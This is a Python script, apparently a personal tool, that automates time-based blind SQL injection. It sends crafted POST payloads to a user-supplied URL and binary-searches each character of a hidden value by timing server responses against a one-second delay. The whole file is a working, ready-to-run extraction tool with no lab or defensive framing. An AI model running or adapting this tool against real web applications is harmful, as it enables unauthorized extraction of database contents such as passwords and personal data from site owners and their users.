import sys, requests
from datetime import timedelta
import argparse


def createParser():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url")
    parser.add_argument("-q", "--query")
    parser.add_argument("-d", "--data")
    #    parser.add_argument("-h", "--help")
    #    parser.add_argument("-H", "--headers")

    return parser


def blind_query(char_index, mid, znak, namespace):
    #  a = namespace.query.replace("[INDEX]", str(char_index)).replace("[MID]", str(mid)).replace("[ZNAK]", znak)
    # print(a)
    # print(namespace.data)

    resp = requests.post(url=namespace.url, data={namespace.data: namespace.query.replace("[INDEX]", str(char_index))
                         .replace("[MID]", str(mid))
                         .replace("[ZNAK]", znak)
                                                  })
    requtime = resp.elapsed
    resp.close()
    if requtime > answer_delay:
        return True
    else:
        return False


def reqursion_find(start, end, char_index, namespace):
    if start > end:
        return -1
    mid = (start + end) // 2
    if blind_query(char_index=char_index, mid=mid, znak="=", namespace=namespace):
        return mid

    if blind_query(char_index=char_index, mid=mid, znak="<", namespace=namespace):
        return reqursion_find(start, mid - 1, char_index=char_index, namespace=namespace)
    else:
        return reqursion_find(mid + 1, end, char_index=char_index, namespace=namespace)


if __name__ == "__main__":
    parser = createParser()
    namespace = parser.parse_args(sys.argv[1:])
    answer_delay = timedelta(seconds=1)

    final_str = ""
    for i in range(1, 75):
        char = reqursion_find(32, 126, i, namespace)
        if char == -1:
            print("work finish")
            print(final_str)
            break
        else:
            final_str += chr(int(char))
        print(chr(int(char)))


